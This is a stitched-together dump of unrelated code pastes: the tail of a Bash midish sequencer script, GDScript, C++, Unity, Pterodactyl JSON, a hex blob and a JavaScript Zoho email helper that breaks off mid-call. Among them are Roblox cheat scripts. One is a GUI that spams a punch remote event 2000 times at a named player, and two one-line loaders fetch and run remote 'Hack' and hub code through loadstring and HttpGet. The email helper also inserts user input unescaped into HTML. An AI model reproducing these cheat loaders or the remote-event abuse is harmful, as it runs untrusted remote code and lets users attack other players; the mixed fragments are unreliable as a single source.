   notes=(C#  D2  D#  E   F   F#  G   G#  A   A#  B   C   C#  D2  D#  E   F   F#  G   G#  A   A#  B   C1  C#1 D21 D#1 E1  F1  F#1 G1  G#1 A1  A#1 B1  C2  C#2 D2  D#2 E2  F2  F#2 G2  G#2 A2  A#2 B2  C3  C#3 D3  D#3 E3  F3  F#3 G3  G#3 A3  A#3 B3  C4  C#4 D4  D#4 E4  F4  F#4 G4  G#4 A4  A#4 B4  C5  C#5 D5  D#5 E5  F5  F#5 G5  G#5 A5  A#5 B5  C6  C#6 D6  D#6 E6  F6  F#6 G6  G#6 A6  A#6 B6  C7  C#7 D7  D#7 E7  F7  F#7 G7  G#7 A7  A#7 B7  C8  C#8 D8  D#8 E8  F8  F#8 G8  G#8 A8  A#8 B8)    
 
   clear
 
   # Show notes
   max=$(awk '{print NF}' midishtemp)
   echo -e ""\e[34;1mSteps/beats: \e[0m""
   for (( n=1; n<=$max; n++ ))
   do
      entry=$(awk '{print $'$n'}' midishtemp)
      # If number then convert, if letter (like 'l' for long note) then print
      if [[ $entry =~ [0-9] ]]
         then
         # Print every entry in 8 ""spaces""
         #printf ""[%2s]"" $n; printf ""%-4s"" ${notes[$entry]}
         printf ""[%2s]%-4s"" $n ${notes[$entry]}
         else
         printf ""[%2s]%-4s"" $n $entry
      fi
      # If multple of 4 then new line
      if (( $n % 4 == 0 )); 
         then  echo
      fi
   done
  
   # Ask to edit notes or show note-numbers, else back to Menu
   printf ""\e[34;1m\nChoose:\n\e[0m""
   printf ""    [e] Edit a note.\n""
   printf ""[Enter] Show the array of Midi note-numbers to\n        use in midish.\n""
   read -sN 1 answer
   echo
   if [[ $answer != ""e"" ]] 
      then
      cat midishtemp
      echo -e ""\e[34;1m\nPress enter to return to Menu\e[0m""; read
      menu
   fi

   # Check if port-number has been set already i.e if it is a number. If not then ask for a portnumber.
   if ! [[ $portnumber =~ ^[0-9]+$ ]] 
      then
      aseqdump -l | sed 's/.//40g'  
      printf ""Port number of Midi keyboard: ""
      read portnumber
   fi

   printf ""Step to change: ""
   read step
   printf ""Enter note on Midi keyboard:""
   # Use the function 'single_note'. Note: that function needs the var $portnumber. If you haven't called the function 'noteinput' then that $portnumber isn't set.
   # We must use an ugly -v workaround for awk, maybe this can be done differently?
   # With awk replace one note (i.e. one field) in the only record in the file.
   awk -v note=$(single_note) '{ {$'$step'= note} print $0 }' midishtemp > midishtemptemp; mv midishtemptemp midishtemp
   # Concatenate/remove line ending:
   sed -i -z 's/\n/ /g' midishtemp
   # Loop back:
   $FUNCNAME
}


function play()
{
   # This function lets one play a synth in midish ""interactive"" mode. Adittionally it can send midish to the background.
   #
   # This function connects previously set $input to $output (from the function connect()) and starts [i]nteractive mode in midish. 

   trap ""menu"" 2

   function play_my_synth()
   {
      midish -b <<END
      exec ""/home/$USER/.midishrc""
      exec ""/home/$USER/.midish_extrarc""
      rnew $input $output
      $clock_command
      i
END
   }

   read -N 1 -p ""Do you want to direct midish to the background [y/n=Enter]? "" answer; echo
   if [[ $answer == 'y' ]] 
      then
      play_my_synth &>/dev/null &
      echo ""Midish is now running in the backround.""
      else
      play_my_synth
   fi
   echo -e ""\e[34;1mPress enter to return to Menu\e[0m""; read bogusvalue
   menu
}


function midish_play()
{
   # This function plays a sequence in midish.
   # 
   # This function needs the following variable(s) to be set for additional
   # midish commands (loop etc.):
   #
   #    $midish_command: additional midish commands

   midish -b <<-END
   print
   print ""============================================================================""
   exec ""/home/$USER/.midishrc""
   exec ""/home/$USER/.midish_extrarc""
   print ""============================================================================""
   print
   print
   rnew $input $output
   t $tempo
   sequence $seq
   tcheck
   $clock_command
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print
   print ""Starting playback.""
   print ""Ignore the lines below stating: 'alsa_open: couldn't parse alsa port'.""
   $midish_command
   p
	END
}


function seqplay()
{
   # This function plays a sequence once or in a loop.
   # 
   # This function NEEDS the function(s):
   #    midish_play    : to play a sequence
   # 
   # This function defines the following variables:
   #    $seq           : sequence between curly braces
   #    $answer        : play or loop? 
   #
   # This function sets the following variable(s) for other fu's:
   #    $midish_command: additional commands to use in midish_play()

   # Reset trap
   trap ""menu"" 2
   
   # Check if in- and out put are set
   if [[ -z $output ]]; then
      echo ""Connect in- and output first.""
      read -p ""Press Enter to continue..."" bogusvalue
      menu
   fi

   # Place midi note-numbers between accoulades and get rid of the bleedin' line ending
   seq=$(printf ""{"";  sed -z 's/\n//' midishtemp; printf ""}"")

   # Make choice: play or loop
   read -N 1 -p ""Choose [p]lay or [l]oop current sequence."" answer
   echo
   if [[ $answer == 'p' ]]
      then
      #my
      midish_command=""""
      midish_play
      else
      #loop
      # Test if this works:
      midish_command=""sel 1; loop""
      midish_play
   fi

   # Loop back to menu
   trap ""midishscript.sh"" 2 # set trap back to ""normal""
   echo -e ""\e[34;1mPress enter to return to Menu\e[0m""; read bogusvalue
   menu
}



#########################
#  M E N U   O T H E R  #
#########################
function other()
{
   # 'Other' menu.
   # Reset trap:
   trap ""exit"" 2
   clear
   echo ""Other""
   echo ""=====""
   echo ""1. [T]empo: Midi and Master device""
   echo ""2. Set metronome on/off""
   echo ""3. [K]ill midish in backround""
   echo ""4. Chord menu""
   echo ""5. Add Midi device to midish""
   echo
   echo ""M. Main menu""

   echo -e -n ""\nChoice (don't press Enter): ""; read -N 1 i; echo
   case $i in 
      2) metronome;;
      4) chord;;
      5) midishcreaterc.sh;;
      k|3) killall midish; menu;;
      m) menu;;
      t|1) tempo
   esac
}


function tempo()
{
  # This function sets the tempo and the Master device for the clock (tempo).
   #
   # This function sets the following variable(s):
   #    $tempo        : currenent/new tempo
   #    $tempo_old    : save old value of $tempo for later
   #    $max          : number of devices in .midishrc
   #    $masterdevice : master device for the clock, used to set $clock_command
   #    $new_masterdevice: new master device
   #    $clock_command: used in the other script, in play_chain()

   clear

   # 1. Set tempo
   echo ""Current Midi tempo: $tempo""
   #; tempo_old=""$tempo"" # save old tempo for later
   read -p ""New tempo (press Enter to skip): "" new_tempo
   # If NOT pressed Enter (ASCII \0A) then set tempo to new tempo. Else do nothing.
   # https://stackoverflow.com/questions/2612274/bash-shell-scripting-detect-the-enter-key
   if [[ $new_tempo != $'\0A' ]]; then
      tempo=$new_tempo
      # Save variable $tempo for other script 
      export tempo
   fi
 
   # 2. Set Master clock device
   echo
   echo -e ""Current Master clock device (nil means R. Pi): $masterdevice \nList of Master clock devices:""
   # Print list of midish devices
   max=$(cat  ~/.midishrc | grep -Ec ""dnew"")
   for (( n=1; n<=$max; n++ ))
   do
      # Use awk twice: first with the standard [F]ield separator <space> for the device number and then with "" as FS for the device name.
      cat  ~/.midishrc | grep ""dnew"" | awk       'NR=='$n' {printf ""Device %s = "", $2}'
      cat  ~/.midishrc | grep ""dnew"" | awk -F'""' 'NR=='$n' {printf ""%s\n"", $2}'
   done

   read -p ""New Master clock device (press Enter to skip): "" new_masterdevice

   # If NOT pressed Enter (ASCII \0A) then set new master device, else skip. Also check if device number is correct because midish won't work w/ a wrong dev.nr.
   # Midish bug? In batch (-b) mode you cannot set 'dclkrx nil' like in normal mode. So IF $masterdevice is nil THEN ...
   if [[ $new_masterdevice != $'\0A' && $new_masterdevice -lt $max ]]; then
      masterdevice=$new_masterdevice
      # Convert $masterdevice into $clock_command
      clock_command=""dclkrx $masterdevice""
      # Save variable for other script 
      export clock_command
   elif [[ $new_masterdevice -gt $((max-1)) ]]; then
      echo ""Wrong device number entered. Try again.""; read -p ""Press Enter to continue...""
      # Loop
      tempo
   fi

   # Loop
   read -p ""Press Enter to continue..."" bogusvalue
   menu
}


function metronome()
{
   echo ""WiP""
}


function chord()
{
  # WiP ...
  midishchord.sh
  # 1. Enter chord(s)
  # 2. Chain chords into song (in separate midish track?)
  # 3. Can I use an existing functions or write (a whole lotta) new ones?
}


###################
#  H E L P   M E  #
###################
function help_me()
{
   clear
   echo -e ""\e[32m\
1. This Bash script is meant to be used as a simple old school sequencer. You create bars of 16 steps and chain those into songs. This script uses 'midish' from https://midish.org .

2. Make sure that you've defined your Midi hardware in midish's config file ~.midishrc!

3. This script also uses the 'midish_extrarc' file from http://juliencoder.de/test/index.php?page=software/index .

4. When entering notes for a sequence you can push the mod wheel all the way up and back again to enter a [s]ilence/skip. You can push the pitch wheel all the way up to enter a [l]ong note (of 2 steps) after the 'l'. Or you can push the pitch wheel all the way down to enter a very [ll]ong note (of 4 steps/one beat) after the 'll'.
\e[0m"" | more -d
   echo -e ""\e[34;1mPress enter to return to Menu\e[0m""; read bogusvalue
   menu
}


###################################
#  S T A R T   O F   S C R I P T  #
###################################
# For use in the other script. If you start this script w/ the commandline option -c then it jumps to the function 'connect'.
if [[ $1 == '-c' ]]; then
   connect
fi
menu"
neAyXBBV,Untitled,nanathecarrot,GDScript,Sunday 6th of July 2025 09:43:31 AM CDT,"@tool
extends ScrollContainer

@onready var v_box_container: VBoxContainer = $VBoxContainer
var max_height: float = 0.0


func _notification(what: int) -> void:
	match what:
		NOTIFICATION_SORT_CHILDREN: # children are reordered or their transforms/sizes are affected.
			custom_minimum_size.y = min(v_box_container.size.y, max_height)

		NOTIFICATION_PARENTED, NOTIFICATION_VISIBILITY_CHANGED:
			# Get the maximum possible size
			size_flags_vertical = SIZE_EXPAND_FILL
			await get_tree().process_frame
			max_height = size.y
			size_flags_vertical = SIZE_SHRINK_BEGIN
"
qBY79qmE,"INOI Mock #4, Question 3 : n * q time complexity (Ignore Constants)",Dynonychus,C++,Sunday 6th of July 2025 06:48:04 AM CDT,"#include <bits/stdc++.h>
#define int long long

using namespace std;

signed main() {
    int n=0;
    int m=0;
    int p=0;
    int queries=0;
    int r=0;
    int s=0;
    int k=0;
    int a=0;
    int b=0;
    int c=0;
    int d=0;
    int e=0;
    int x=0;
    int y=0;
    int z=0;
    int i=0;
    int j=0;
    bool check1=false;
    bool check2=false;
    string u;
    string v;
    
    cin>>n;
    vector<vector<pair<int, int>>> adj(n);
    
    for(i=1;i<n;i++) {
        cin>>a>>b>>c;
        
        adj[a].push_back({b, c});
        adj[b].push_back({a, c});
    }
    
    cin>>queries;
    
    while(queries--) {
        cin>>a>>b>>c>>d>>e;
        
        vector<pair<int, int>> par(n, {-1, -1});
        
        vector<bool> vis(n, false);
        
        queue<int> q;
        
        q.push(a);
        
        while(!q.empty()) {
            p = q.front();
            q.pop();
            
            if(vis[p])
            continue;
            
            vis[p] = true;
            
            for(auto x : adj[p]) {
                if(!vis[x.first]) {
                    par[x.first] = {p, x.second};
                    q.push(x.first);
                }
            }
        }
        
        // for(i=0;i < n;i++) {
        //     cout<<i<<"": ""<<par[i].first<<"" ""<<par[i].second<<endl;
        // }
        
        for(i=0;i<n;i++)
        vis[i] = false;
        
        x=0;
        
        while(par[b].first != -1) {
            if(!vis[b])
            x += par[b].second;
            
            else
            break;
            
            vis[b] = true;
            
            b = par[b].first;
        }
        
        while(par[c].first != -1) {
            if(!vis[c])
            x += par[c].second;
            
            else
            break;
            
            vis[c] = true;
            
            c = par[c].first;
        }
        
        while(par[d].first != -1) {
            if(!vis[d])
            x += par[d].second;
            
            else
            break;
            
            vis[d] = true;
            
            d = par[d].first;
        }
        
        while(par[e].first != -1) {
            if(!vis[e])
            x += par[e].second;
            
            else
            break;
            
            vis[e] = true;
            
            e = par[e].first;
        }
        
        // cout<<""HEY""<<endl;
        
        cout<<x<<endl;
    }
    
    return 0;
}"
cT0Apq5B,Loop,AceW0lf_BOt,Lua,Sunday 6th of July 2025 06:39:34 AM CDT,"-- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local UICorner = Instance.new(""UICorner"")
local UIGradient = Instance.new(""UIGradient"")
local Playername = Instance.new(""TextBox"")
local UICorner_2 = Instance.new(""UICorner"")
local TextLabel = Instance.new(""TextLabel"")
local UICorner_3 = Instance.new(""UICorner"")
local UIGradient_2 = Instance.new(""UIGradient"")
local TextLabel_2 = Instance.new(""TextLabel"")
local UICorner_4 = Instance.new(""UICorner"")
local UIGradient_3 = Instance.new(""UIGradient"")
local TextLabel_3 = Instance.new(""TextLabel"")
local UICorner_5 = Instance.new(""UICorner"")
local UIGradient_4 = Instance.new(""UIGradient"")
local Loop = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.645631075, 0, 0.46227929, 0)
Frame.Size = UDim2.new(0, 161, 0, 179)
Frame.Active = true
Frame.Draggable = true

UICorner.Parent = Frame

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(85, 0, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient.Parent = Frame

Playername.Name = ""Playername""
Playername.Parent = Frame
Playername.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Playername.Position = UDim2.new(0.0434782617, 0, 0.134078205, 0)
Playername.Size = UDim2.new(0, 147, 0, 41)
Playername.Font = Enum.Font.SourceSans
Playername.Text = """"
Playername.TextColor3 = Color3.fromRGB(0, 0, 0)
Playername.TextSize = 14.000

UICorner_2.Parent = Playername

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.Position = UDim2.new(-0.24844721, 0, 0.30726257, 0)
TextLabel.Size = UDim2.new(0, 40, 0, 102)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = """"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 14.000

UICorner_3.Parent = TextLabel

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(85, 0, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_2.Parent = TextLabel

TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.Position = UDim2.new(3.7252903e-09, 0, 0.966480374, 0)
TextLabel_2.Size = UDim2.new(0, 50, 0, 40)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = """"
TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.TextSize = 14.000

UICorner_4.Parent = TextLabel_2

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(85, 0, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_3.Parent = TextLabel_2

TextLabel_3.Parent = Frame
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.Position = UDim2.new(0.689440966, 0, 0.966480374, 0)
TextLabel_3.Size = UDim2.new(0, 50, 0, 40)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = """"
TextLabel_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.TextSize = 14.000

UICorner_5.Parent = TextLabel_3

UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(85, 0, 127)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 0))}
UIGradient_4.Parent = TextLabel_3

Loop.Name = ""Loop""
Loop.Parent = Frame
Loop.BackgroundColor3 = Color3.fromRGB(85, 0, 127)
Loop.BackgroundTransparency = 0.700
Loop.Position = UDim2.new(0.0434782617, 0, 0.508379877, 0)
Loop.Size = UDim2.new(0, 147, 0, 49)
Loop.Font = Enum.Font.SourceSans
Loop.Text = ""LOOP""
Loop.TextColor3 = Color3.fromRGB(255, 255, 255)
Loop.TextSize = 30.000

UICorner_6.Parent = Loop

Loop.MouseButton1Click:connect(function()

	local field = Playername.Text

	local LocalUser = game.Players.LocalPlayer
	local ENEMY = field

	for i=1,2000 do 
		game.ReplicatedStorage.Remotes.Human_Punch:FireServer(LocalUser.Character.LeftHand, ""LeftPunch"", game.Workspace[ENEMY].LeftHand, 5, true, ""RightPunch"", LocalUser.Character.Boxing.Handle.Hit, 100)
		wait()
	end
end)

Playername.FocusLost:connect(function()
	for i,v in pairs(game.Players:GetChildren()) do
		if (string.sub(string.lower(v.Name),1,string.len(Playername.Text))) == string.lower(Playername.Text) then
			Playername.Text = v.Name
		end
	end
end)"
sNxt7dF5,Background AutoClicker,DashaBars,Lua,Sunday 6th of July 2025 06:35:41 AM CDT,loadstring(game:HttpGet('https://raw.githubusercontent.com/DashaBars/Hack/refs/heads/main/Background%20AutoClicker.lua'))()
D3Yd2AHe,vibe-coded ai-written Pterodactyl panel Egg for StirlingPDF service,Oliinyk,JSON,Sunday 6th of July 2025 06:14:39 AM CDT,"{
  ""_comment"": ""DO NOT EDIT: FILE GENERATED AUTOMATICALLY BY PTERODACTYL PANEL - PTERODACTYL.IO"",
  ""meta"": {
    ""version"": ""PTDL_v2"",
    ""update_url"": null
  },
  ""exported_at"": ""2025-07-06T11:01:48+00:00"",
  ""name"": ""Stirling-PDF"",
  ""author"": ""admin@example.com"",
  ""description"": ""Stirling-PDF is a robust, locally hosted web-based PDF manipulation tool. It enables you to carry out various operations on PDF files, including splitting, merging, converting, reorganizing, adding images, rotating, compressing, and more."",
  ""features"": [
    ""java_version""
  ],
  ""docker_images"": {
    ""Java 21"": ""ghcr.io/pterodactyl/yolks:java_21"",
    ""Java 17"": ""ghcr.io/pterodactyl/yolks:java_17""
  },
  ""file_denylist"": [],
  ""startup"": ""java -Xms{{SERVER_MEMORY}}M -Xmx{{SERVER_MEMORY}}M -Dfile.encoding=UTF-8 -jar {{JARFILE}}"",
  ""config"": {
    ""files"": ""{\r\n    \""application.properties\"": {\r\n        \""parser\"": \""properties\"",\r\n        \""find\"": {\r\n            \""server.port\"": \""{{server.build.default.port}}\"",\r\n            \""server.address\"": \""0.0.0.0\""\r\n        }\r\n    }\r\n}"",
    ""startup"": ""{\r\n    \""done\"": \""Started StirlingPdfApplication\""\r\n}"",
    ""logs"": ""{}"",
    ""stop"": ""^C""
  },
  ""scripts"": {
    ""installation"": {
      ""script"": ""#!/bin/bash\r\n# Stirling-PDF Installation Script\r\n#\r\n# Server Files: /mnt/server\r\n\r\ncd /mnt/server\r\n\r\n# Make sure we have basic tools\r\necho \""Installing dependencies...\""\r\napt update\r\napt install -y curl wget jq\r\n\r\n# Determine download URL\r\nif [ -n \""${DOWNLOAD_URL}\"" ] && [ \""${DOWNLOAD_URL}\"" != \""\"" ]; then\r\n    echo \""Using provided download URL: ${DOWNLOAD_URL}\""\r\n    ACTUAL_DOWNLOAD_URL=\""${DOWNLOAD_URL}\""\r\nelse\r\n    # Get latest release from GitHub API\r\n    echo \""Fetching latest release information...\""\r\n    LATEST_RELEASE=$(curl -s \""https://api.github.com/repos/Stirling-Tools/Stirling-PDF/releases/latest\"")\r\n    \r\n    if [ \""${VERSION}\"" = \""latest\"" ] || [ -z \""${VERSION}\"" ]; then\r\n        echo \""Getting latest version...\""\r\n        VERSION=$(echo \""${LATEST_RELEASE}\"" | jq -r '.tag_name' | sed 's/^v//')\r\n        echo \""Latest version: ${VERSION}\""\r\n    fi\r\n    \r\n    # Determine which JAR to download based on ENABLE_LOGIN\r\n    if [ \""${ENABLE_LOGIN}\"" = \""true\"" ]; then\r\n        JAR_NAME=\""Stirling-PDF-with-login.jar\""\r\n        echo \""Downloading Stirling-PDF with login support...\""\r\n    else\r\n        JAR_NAME=\""Stirling-PDF.jar\""\r\n        echo \""Downloading standard Stirling-PDF...\""\r\n    fi\r\n    \r\n    ACTUAL_DOWNLOAD_URL=\""https://github.com/Stirling-Tools/Stirling-PDF/releases/download/v${VERSION}/${JAR_NAME}\""\r\nfi\r\n\r\necho \""Download URL: ${ACTUAL_DOWNLOAD_URL}\""\r\necho \""Target file: ${JARFILE}\""\r\n\r\n# Download the JAR file\r\necho \""Downloading Stirling-PDF...\""\r\nif [ -f \""${JARFILE}\"" ]; then\r\n    echo \""Backing up existing JAR file...\""\r\n    mv \""${JARFILE}\"" \""${JARFILE}.bak\""\r\nfi\r\n\r\ncurl -L -o \""${JARFILE}\"" \""${ACTUAL_DOWNLOAD_URL}\""\r\n\r\nif [ ! -f \""${JARFILE}\"" ]; then\r\n    echo \""ERROR: Failed to download JAR file!\""\r\n    if [ -f \""${JARFILE}.bak\"" ]; then\r\n        echo \""Restoring backup...\""\r\n        mv \""${JARFILE}.bak\"" \""${JARFILE}\""\r\n    fi\r\n    exit 1\r\nfi\r\n\r\n# Verify the JAR file\r\necho \""Verifying downloaded file...\""\r\nfile_size=$(stat -c%s \""${JARFILE}\"")\r\nif [ \""$file_size\"" -lt 1000000 ]; then\r\n    echo \""ERROR: Downloaded file seems too small (${file_size} bytes). Download may have failed.\""\r\n    cat \""${JARFILE}\""\r\n    exit 1\r\nfi\r\n\r\necho \""Download completed successfully!\""\r\necho \""File size: ${file_size} bytes\""\r\n\r\n# Create application.properties if it doesn't exist\r\nif [ ! -f \""application.properties\"" ]; then\r\n    echo \""Creating default application.properties...\""\r\n    cat > application.properties << EOF\r\nserver.port=8080\r\nserver.address=0.0.0.0\r\nlogging.level.stirling=INFO\r\nlogging.level.org.springframework.web=INFO\r\nEOF\r\nfi\r\n\r\n# Create necessary directories\r\nmkdir -p configs customFiles logs\r\n\r\necho \""Installation completed successfully!\""\r\necho \""JAR file: ${JARFILE}\""\r\necho \""Ready to start Stirling-PDF!\"""",
      ""container"": ""ghcr.io/pterodactyl/installers:debian"",
      ""entrypoint"": ""bash""
    }
  },
  ""variables"": [
    {
      ""name"": ""JAR File Name"",
      ""description"": ""The name of the Stirling-PDF JAR file."",
      ""env_variable"": ""JARFILE"",
      ""default_value"": ""Stirling-PDF.jar"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|regex:/^([\\w\\d._-]+)(\\.jar)$/"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Version"",
      ""description"": ""The version of Stirling-PDF to install. Use 'latest' for the most recent version."",
      ""env_variable"": ""VERSION"",
      ""default_value"": ""latest"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|string|max:20"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Download URL"",
      ""description"": ""Direct download URL for a specific Stirling-PDF JAR file. Leave empty to use automatic version detection."",
      ""env_variable"": ""DOWNLOAD_URL"",
      ""default_value"": """",
      ""user_viewable"": false,
      ""user_editable"": false,
      ""rules"": ""nullable|url"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Enable Login Support"",
      ""description"": ""Enable this to download the version with login/authentication support."",
      ""env_variable"": ""ENABLE_LOGIN"",
      ""default_value"": ""false"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|string|in:true,false"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Security Features"",
      ""description"": ""Enable Docker security features. Set to 'false' for easier setup, 'true' for production."",
      ""env_variable"": ""DOCKER_ENABLE_SECURITY"",
      ""default_value"": ""false"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|string|in:true,false"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Language"",
      ""description"": ""Set the default language (e.g., en_GB, de_DE, fr_FR, es_ES, etc.)"",
      ""env_variable"": ""LANGS"",
      ""default_value"": ""en_GB"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|string|max:10"",
      ""field_type"": ""text""
    },
    {
      ""name"": ""Advanced Features"",
      ""description"": ""Install book and advanced HTML operations. Set to 'false' for lighter installation."",
      ""env_variable"": ""INSTALL_BOOK_AND_ADVANCED_HTML_OPS"",
      ""default_value"": ""false"",
      ""user_viewable"": true,
      ""user_editable"": true,
      ""rules"": ""required|string|in:true,false"",
      ""field_type"": ""text""
    }
  ]
}"
xej2yxVw,dataNone,TestGuy1,JSON,Sunday 6th of July 2025 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '3c5f3a350d0bc57a1343dbb880c10b8afd6000a5bc6a4721ebfc585b8433d945f2a5d8eb35060ca1d5b8d3d529f431877c99b3a638a9a2df62b41a0376bbae416403a3224f9b32378ec40de435a6dbde8c632fd037c392bf0ce0baa5c6e595f8ddf813de6f97d32ff625f8b6aa191fba9516d5deac82f42a765df98fe07b9a9c',
  otherdata: [
    'da115cc6ffd045ba0d00bb0a391711f3',
    '6eca2af65e66e13a3880179d2b849240',
    '8920469cbd171e2b4e7e22d2aaef73e2',
    '9a060819ce42f54710aaadb11c63b80b',
    'd3bb5e6feb069ae40730f80a23fc444d',
    '8659e6af3237c21bdd425ce0055c52aa',
    '41192f68349ff367f686adaa1f55185c',
    '998219c1dacc52b7bcbe1c13d55fc525'
  ]
}"
a02QFt4y,PlayerWallet,FlyingFrog,C#,Sunday 6th of July 2025 03:23:08 AM CDT,"using UnityEngine;
using System;
using YG;

public class PlayerWallet : MonoBehaviour
{
    [SerializeField] private MoneyEarner _earner;

    private int _currentMoney;
    private int _earnedMoney;

    public int CurrentMoney => _currentMoney;

    public event Action<int> MoneyChanged;

    private void Start()
    {
        _earnedMoney = YandexGame.savesData.earnedMoney;
        _currentMoney = YandexGame.savesData.playerMoney;
        MoneyChanged?.Invoke(_currentMoney);
    }
    private void Update()
    {
        if (Input.GetKeyDown(KeyCode.J))
        {
            AddMoney(200000);
        }
    }
    private void OnEnable()
    {
        _earner.MoneyEarned += OnMoneyEarned;
    }

    private void OnDisable()
    {
        _earner.MoneyEarned -= OnMoneyEarned;
    }

    public void AddMoney(int money)
    {
        _currentMoney += money;
        _earnedMoney += money;
        MoneyChanged?.Invoke(_currentMoney);
        YandexGame.savesData.earnedMoney = _earnedMoney;
        YandexGame.savesData.playerMoney = _currentMoney;
        YandexGame.NewLeaderboardScores(""earnedMoney"", _earnedMoney);
        YandexGame.SaveProgress();
    }

    public void SpendMoney(int money)
    {
        _currentMoney -= money;
        MoneyChanged?.Invoke(_currentMoney);
        YandexGame.savesData.playerMoney = _currentMoney;
        YandexGame.SaveProgress();
    }

    private void OnMoneyEarned(int money, bool hasMagnet)
    {
        if (hasMagnet) 
        { 
            AddMoney(money);
        }
    }
}"
UqUibEK6,Grow a garden Script Roblox,ttjy,Lua,Sunday 6th of July 2025 03:18:13 AM CDT,"--# Document/How To Use/Bugs : https://ttjy-hub.gitbook.io/flow/
--# Discord Server : https://discord.gg/flows
--# Youtube : https://www.youtube.com/@ttjyTeam

loadstring(game:HttpGet(""https://raw.githubusercontent.com/Yumiara/SS-Luarmor/refs/heads/main/API/M.luau""))();"
gS7DwUR3,Untitled,bebo231312312321,JavaScript,Sunday 6th of July 2025 01:23:48 AM CDT,"async function sendResetEmail(email, resetToken) {
    const resetLink = `${process.env.FRONTEND_SERVER}/reset-password?token=${resetToken}`;
    const subject = 'Password Reset Request';
    const body = `
      <html>
        <body>
          <p>Click the following link to reset your password:</p>
          <a href=""${resetLink}"" style=""color: #1a73e8; text-decoration: none;"">${resetLink}</a>
        </body>
      </html>
    `;
    const data = {
        fromAddress: 'info@pensa.club',
        toAddress: email,
        subject,
        content: body,
    };
    return sendZohoEmailRaw(data);
}

async function forwardEmailsViaZoho({ name, userEmail, subject, body, toAddresses }) {
    const formattedSubject = `[Contact Form] ${name} <${userEmail}> | Subject - ${subject}`;
    const formattedBody = `
        <html>
            <body style=""font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; background: #f9f9f9;"">
                <div style=""
                    padding: 12px 0 12px 16px;
                    margin: 20px 0 0 0;
                    text-align: left;
                    color: #222;
                    font-size: 20px;
                    font-weight: bold;
                    background: #fff;
                    position: relative;
                    overflow: hidden;
                "">
                    <table width=""100%"" cellpadding=""0"" cellspacing=""0"" style=""background: #fff; margin-bottom: 20px;"">
                        <tr>
                            <td width=""8"" style=""
                                background: linear-gradient(to bottom, #f47920, #2986c7);
                                background-color: #f47920;
                                border-radius: 4px;
                            "">
                                &nbsp;
                            </td>
                            <td style=""
                                padding: 4px 0 4px 12px;
                                color: #222;
                                font-size: 20px;
                                font-weight: bold;
                            "">
                                ${subject}
                            </td>
                        </tr>
                    </table>
                </div>
                <div style=""background: #fff; padding: 20px; border-radius: 0 0 8px 8px; box-shadow: 0 4px 24px rgba(0,0,0,0.08); margin-top: 16px;"">
                    <p><strong>From:</strong> ${name}</p>
                    <p><strong>Email:</strong> <a href=""mailto:${userEmail}"">${userEmail}</a></p>
                    <hr style=""margin: 20px 0;"">
                    <table cellpadding=""0"" cellspacing=""0"" style=""margin-bottom: 10px;"">
                        <tr>
                            <td width=""8"" style=""
                                background: linear-gradient(to bottom, #f47920, #2986c7);
                                background-color: #f47920;
                                border-radius: 4px;
                            "">
                                &nbsp;
                            </td>
                            <td style=""
                                padding: 4px 0 4px 12px;
                                color: #222;
                                font-size: 18px;
                                font-weight: bold;
                            "">
                                Message:
                            </td>
                        </tr>
                    </table>
                    <div style=""background: #f7f7f7; padding: 16px; border-radius: 6px; color: #222; font-size: 16px; line-height: 1.6; max-height: 300px; overflow-y: auto; word-break: break-word;"">
                        ${body}
                    </div>
                </div>
            </body>
        </html>
    `;
    const data = {
        fromAddress: 'info@pensa.club',
        toAddress: Array.isArray(toAddresses) ? toAddresses.join(',') : toAddresses,
        subject: formattedSubject,
        content: formattedBody,
    };
    return sendZohoEmailRaw(data);
}

async function sendZohoEmailRaw(data) {
    const url = `https://mail.zoho.eu/api/accounts/${process.env.ZOHO_ACCOUNT_ID}/messages`;

    if (!process.env.ZOHO_ACCESS_TOKEN) {
        process.env.ZOHO_ACCESS_TOKEN = await getZohoAccessToken();
    }

    let response = await fetch(url, {
        method: 'POST',
        headers: {
